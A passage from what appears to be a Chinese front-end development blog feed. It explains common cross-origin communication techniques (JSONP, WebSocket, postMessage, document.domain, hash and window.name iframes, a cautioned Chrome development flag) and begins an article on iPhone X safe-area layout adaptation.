class="string">&quot;http://localhost:8080/api/a.js?a=123&amp;cb=sonpCallback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">// http://localhost:8080/api/a.js jsonpCallback(&#123;a:123&#125;);</span></span><br></pre></td></tr></table></figure><p>你仔细品，细细品，是不是 jsonp 有的优势就是 script 加载 js 的优势，加载的方式只不过换了一种说法。这也告诉我们一个道理，很多东西并没有那么神奇，是在你所学的知识范围内。就好比，桃树和柳树，如果你把他们当成很大跨度的东西去记忆理解，那么世上这么多树，你真的要累死了，你把他们都当成是树，哦吼？你会突然发现，你对世界上所有的树都有所了解，他们都会长叶子，光合作用….当然也有个例，但是你只需要去记忆这些细微的差别，抓住主干。。。嗯，反正就这么个道理。</p><p><a name="zCLt6"></a></p><h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><p><a href="http://dev.w3.org/html5/websockets/">WebSocket</a> 规范定义了一种 API，可在网络浏览器和服务器之间建立“套接字”连接。简单地说：客户端和服务器之间存在持久的连接，而且双方都可以随时开始发送数据。详细教程可以看 <a href="https://www.html5rocks.com/zh/tutorials/websockets/basics/">https://www.html5rocks.com/zh/tutorials/websockets/basics/</a><br />这种方式本质没有使用了 HTTP 的响应头, 因此也没有跨域的限制，没有什么过多的解释直接上代码吧。<br />前端部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">let</span> socket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://localhost:8080&quot;</span>);</span><br><span class="line">  socket.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    socket.<span class="title function_">send</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  socket.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>后端部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const WebSocket = require(&quot;ws&quot;);</span><br><span class="line">const server = new WebSocket.Server(&#123; port: 8080 &#125;);</span><br><span class="line">server.on(&quot;connection&quot;, function(socket) &#123;</span><br><span class="line">  socket.on(&quot;message&quot;, function(data) &#123;</span><br><span class="line">    socket.send(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="8tAHi"></a></p><h3 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h3><p><strong>window.postMessage()</strong> 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为 https），端口号（443 为 https 的默认值），以及主机 (两个页面的模数 <code>[Document.domain](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/domain)</code>设置为相同的值) 时，这两个脚本才能相互通信。<strong>window.postMessage()</strong> 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。<br><a name="K6jTM"></a></p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>1.页面和其打开的新窗口的数据传递<br />2.多窗口之间消息传递<br />3.页面与嵌套的 iframe 消息传递<br><a name="tw30z"></a></p><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><p>详细用法看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a><br /><code>otherWindow.postMessage(message, targetOrigin, [transfer]);</code></p><ul><li>otherWindow: 其他窗口的一个引用，比如 iframe 的 contentWindow 属性、执行<a href="https://developer.mozilla.org/en-US/docs/DOM/window.open">window.open</a>返回的窗口对象、或者是命名过或数值索引的<a href="https://developer.mozilla.org/en-US/docs/DOM/window.frames">window.frames</a>。</li><li>message: 将要发送到其他 window 的数据。</li><li>targetOrigin: 通过窗口的 origin 属性来指定哪些窗口能接收到消息事件.</li><li>transfer(可选) : 是一串和 message 同时传递的 <code>[Transferable](https://developer.mozilla.org/zh-CN/docs/Web/API/Transferable)</code> 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权<br><a name="HkkTp"></a></li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    iframe.<span class="property">contentWindow</span>.<span class="title function_">postMessage</span>(<span class="string">&quot;秋风的笔记&quot;</span>, <span class="string">&quot;http://localhost:8080&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>another.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>); <span class="comment">// 秋风的笔记</span></span></span><br><span class="line"><span class="language-javascript">    e.<span class="property">source</span>.<span class="title function_">postMessage</span>(e.<span class="property">data</span>, e.<span class="property">origin</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="irBuk"></a></p><h3 id="document-domain-Iframe"><a href="#document-domain-Iframe" class="headerlink" title="document.domain + Iframe"></a>document.domain + Iframe</h3><p>从第 7 种到第 9 种方式，我觉得别人的写的已经很好了，为了完整性，我就拿别人的了。如有雷同….（不对，就是雷同….）不要说不出来。<br /><strong>该方式只能用于二级域名相同的情况下，比如</strong><code>**a.test.com**</code><strong>和</strong><code>**b.test.com**</code><strong>适用于该方式</strong>。 只需要给页面添加 <code>document.domain =&#39;test.com&#39;</code> 表示二级域名都相同就可以实现跨域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.   baidu.  com     .</span><br><span class="line">三级域  二级域   顶级域   根域</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// a.test.com</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  helloa</span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://b.test.com/b.html&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">&quot;frame&quot;</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&quot;test.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(frame.<span class="property">contentWindow</span>.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// b.test.com</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  hellob</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&quot;test.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="za19h"></a></p><h3 id="window-location-hash-Iframe"><a href="#window-location-hash-Iframe" class="headerlink" title="window.location.hash + Iframe"></a>window.location.hash + Iframe</h3><p><a name="C4kD7"></a></p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>原理就是通过 url 带 hash ，通过一个非跨域的中间页面来传递数据。<br><a name="U752Q"></a></p><h4 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h4><p>一开始 a.html 给 c.html 传一个 hash 值，然后 c.html 收到 hash 值后，再把 hash 值传递给 b.html，最后 b.html 将结果放到 a.html 的 hash 值中。 同样的，a.html 和 b.htm l 是同域的，都是 <code>http://localhost:8000</code>，而 c.html 是<code>http://localhost:8080</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// a.html</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/hash/c.html#name1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hash</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onhashchange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hash</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// b.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="property">hash</span> = location.<span class="property">hash</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// c.html</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(location.<span class="property">hash</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  iframe.<span class="property">src</span> = <span class="string">&quot;http://localhost:8000/hash/b.html#name2&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="uIldR"></a></p><h3 id="window-name-Iframe"><a href="#window-name-Iframe" class="headerlink" title="window.name + Iframe"></a>window.name + Iframe</h3><p>window 对象的 name 属性是一个很特别的属性，当该 window 的 location 变化，然后重新加载，它的 name 属性可以依然保持不变。<br />其中 a.html 和 b.html 是同域的，都是<code>http://localhost:8000</code>，而 c.html 是<code>http://localhost:8080</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// a.html</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/name/c.html&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;load()&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> first = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// onload事件会触发2次，第1次加载跨域页，并留存数据于window.name</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">load</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (first) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span></span><br><span class="line"><span class="language-javascript">      iframe.<span class="property">src</span> = <span class="string">&quot;http://localhost:8000/name/b.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      first = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 第2次onload(同域b.html页)成功后，读取同域window.name中数据</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(iframe.<span class="property">contentWindow</span>.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>b.html 为中间代理页，与 a.html 同域，内容为空。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// b.html</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// c.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&quot;秋风的笔记&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过 iframe 的 src 属性由外域转向本地域，跨域数据即由 iframe 的 window.name 从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。</p><p><a name="U3CTa"></a></p><h3 id="浏览器开启跨域（解决提出问题的人）"><a href="#浏览器开启跨域（解决提出问题的人）" class="headerlink" title="浏览器开启跨域（解决提出问题的人）"></a>浏览器开启跨域（解决提出问题的人）</h3><p><strong>非特殊必要情况，不建议使用。</strong><br><a name="windows"></a></p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找到你安装的目录</span><br><span class="line">.\Google\Chrome\Application\chrome.exe --disable-web-security --user-data-dir=xxxx</span><br></pre></td></tr></table></figure><p><a name="mac"></a></p><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><p><code>~/Downloads/chrome-data</code> 这个目录可以自定义.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Google\ Chrome\ Canary.app/Contents/MacOS/Google\ Chrome\ Canary  --disable-web-security --user-data-dir=~/Downloads/chrome-data</span><br></pre></td></tr></table></figure><p><a name="pQ3iJ"></a></p><h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><p><a name="l0jyI"></a></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p> <a href="https://mp.weixin.qq.com/s?__biz=MzA5NzkwNDk3MQ==&mid=2650590313&idx=1&sn=e3fb1d08745d09afa06ffa7db44910d5&scene=21#wechat_redirect">CORS 为什么要区分『简单请求』和『预检请求』？</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
          <category> 浏览器 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html常见兼容问题</title>
      <link href="/2022/07/30/compatible/html-compatible/"/>
      <url>/2022/07/30/compatible/html-compatible/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="fwfFj"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>iphoneX的“刘海”为相机和其他组件留出了空间，同时在底部也留有可操作区域。其实对于 web 前端来说，刘海在绝大多数的场景下是可以不用处理的，因为 safari 或客户端（微信，手Q等）的 statusBar 已经替我们抹平了顶部刘海，我们只需要关心底部的可操作区域，因为如果页面底部有按钮的话，就会被可操作区域给挡住。<br><a name="MGMfZ"></a></p><h3 id="iPhoneX之变化"><a href="#iPhoneX之变化" class="headerlink" title="iPhoneX之变化"></a>iPhoneX之变化</h3><p><a name="yXFoK"></a></p><h4 id="1-屏幕尺寸、分辨率"><a href="#1-屏幕尺寸、分辨率" class="headerlink" title="1. 屏幕尺寸、分辨率"></a>1. 屏幕尺寸、分辨率</h4><p>追求全面屏的 iPhone X 此次启用 5.8 英寸的超视网膜高清显示屏，458ppi 的屏幕像素密度。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635168-afbcb6c4-7f5f-46bf-a1a4-6fbb06a145e4.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635168-afbcb6c4-7f5f-46bf-a1a4-6fbb06a145e4.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />竖屏时像素分辨率达到了 1125px × 2436px（375pt × 812pt @3x），可以发现 iPhone X 的宽度与原来的 iPhone 7 等 4.7 英寸屏的宽度是一致的，而高度却大了 145pt，长宽比也由原来常见的 16 : 9 变成了 13 : 6。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635317-3044724c-c0e4-4f6a-9b7f-34072df4e91c.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635317-3044724c-c0e4-4f6a-9b7f-34072df4e91c.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="gssKl"></a></p><h4 id="2-顶部刘海"><a href="#2-顶部刘海" class="headerlink" title="2.顶部刘海"></a>2.顶部刘海</h4><p>新版本的 iPhone 顶部有高度为 30pt 的黑色圆角条来放置扬声器、前置摄像头及各种传感器等，江湖人称 「刘海儿」，这也意味着原页面此处的内容有可能会被遮挡导致显示欠佳，进而影响用户体验，所以这也是我们需要关注的一个适配点。<br />刘海在绝大多数的场景下是可以不用处理的，因为 safari 或客户端（微信，手Q等）的 statusBar 已经替我们抹平了顶部刘海。<br><a name="xJ7kr"></a></p><h4 id="3-虚拟-Home-键"><a href="#3-虚拟-Home-键" class="headerlink" title="3.虚拟 Home 键"></a>3.虚拟 Home 键</h4><p>iPhone X 取消了以往的实体圆形 home 键，取而代之的是在屏幕底部一条 134pt × 5pt 的虚拟指示条。整个虚拟 Home 键也占据了一个高度 34pt 的保留区域。<br />原来实体 Home 键的单击返回桌面、双击唤起多任务处理、长按启动 Siri 等等基础功能操作，也幻化成了不同的手势操作或新技术替代，具体交互手势将在下节详述。而为了增强手势的操作感，整个虚拟 Home 键也占据了一个高度 34pt 的保留区域。<br />而在非特定条件下，这个虚拟指示条无论在横、竖屏中都将是强制性设计元素出现在屏幕底部上，意味着这设计中必须考虑好周围元素与它的兼容，因此，这又是我们适配过程中的另一个关注点。只有在需要获得沉浸式体验（如播放视频、查看图片）时，才会建议开发者可以虚拟指示条 「自动隐藏」功能。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635248-bb443c96-fa7e-4cb0-8658-e9f810cd41fd.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635248-bb443c96-fa7e-4cb0-8658-e9f810cd41fd.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="w2Klj"></a></p><h4 id="4-安全区域"><a href="#4-安全区域" class="headerlink" title="4.安全区域"></a>4.安全区域</h4><p>根据上述顶部刘海、虚拟 home 键的不同要求，Apple 提供了横、竖屏状态下的安全区域视觉规范。</p><ul><li>竖屏：竖屏时候，除去屏幕最顶部往下 44pt，底部往上 34pt 后，中间部分视为安全区域。</li><li>横屏：而横屏时候则相对复杂一些，因为虚拟指示条通常情况下都是出现在屏幕底部，所以不仅屏幕左右会留出 44pt 的空白位置，屏幕底部也会留出 21pt 的位置。</li></ul><p>至于为什么没有 “刘海儿” 一侧也会留出空白位置，则是 Apple 认为，“刘海儿”出现于左侧或右侧并不确定，让安全区域中的内容居中显示，可以避免屏幕旋转所造成的 UI 元素位置变化。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635212-b26f4b24-0508-4a49-949c-68e341db7424.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635212-b26f4b24-0508-4a49-949c-68e341db7424.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ZRb8e"></a></p><h3 id="适配方案"><a href="#适配方案" class="headerlink" title="适配方案"></a>适配方案</h3><p>了解到 iPhone X 这边变化之后，我们大致可以知道需要在于安全区域布局、全屏图缩放裁切以及边界交互手势做相关的适配。在 iOS11 中我们可以使用 viewport-fit&#x3D;cover + safe-area-inset-*，<br><a name="xTEji"></a></p><h4 id="关于viewport-fit"><a href="#关于viewport-fit" class="headerlink" title="关于viewport-fit"></a>关于viewport-fit</h4><p>viewport-fit 可以设置可视视窗的大小，它有三个属性值：</p><ul><li>Auto：默认值。这个值不影响初始布局视窗，整个 Web 页面是可视的，与Contain表现一致。</li><li>Contain：最初的布局视窗和视觉布局视窗被设置为最大的矩形（左图）。</li><li>Cover：初始布局视窗和视觉布局视窗被设置为设备物理屏幕的限定矩形（右图）。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635183-fb3978a6-de41-4ae6-b070-8589ee304007.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635183-fb3978a6-de41-4ae6-b070-8589ee304007.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="s5zDN"></a></p><h4 id="关于-safe-area-inset"><a href="#关于-safe-area-inset" class="headerlink" title="关于 safe-area-inset-*"></a>关于 safe-area-inset-*</h4><p>各种 iPhone x 都是不规则形状，我们如何控制页面元素到安全区域呢？Apple 把安全区域的位置通过 css 属性提供给了开发者，它们可以通过CSS的constant( )函数来完成：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635694-436826a6-fcfc-4a5c-baf9-bac3a995e66c.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/300943/1666081635694-436826a6-fcfc-4a5c-baf9-bac3a995e66c.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><ul><li>constant(safe-area-inset-top)：在Viewport顶部的安全区域内设置量（CSS像素）</li><li>constant(safe-area-inset-bottom)：在Viewport底部的安全区域内设置量（CSS像素）</li><li>constant(safe-area-inset-left)：在Viewport左边的安全区域内设置量（CSS像素）</li><li>constant(safe-area-inset-right)：在Viewport右边的安全区域内设置量（CSS像素）</li><li><br /></li></ul><p>简单来说我们可以通过 constant( ) 可以获取到非安全边距，再结合 padding 或 margin 来控制页面元素避开非安全区域。 Webkit 在 iOS11 中新增 CSS Functions: env( ) 替代 constant( )，文档中推荐使用 env( )，而 constant( ) 从 Safari Techology Preview 41 和 iOS11.2 Beta 开始会被弃用。在不支持 env( ) 的浏览器中，会自动忽略这一样式规则，不影响网页正常的渲染。为了达到最大兼容目的，我们可以 constant( ) 和 env( ) 同时使用。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.footerClass</span> &#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: 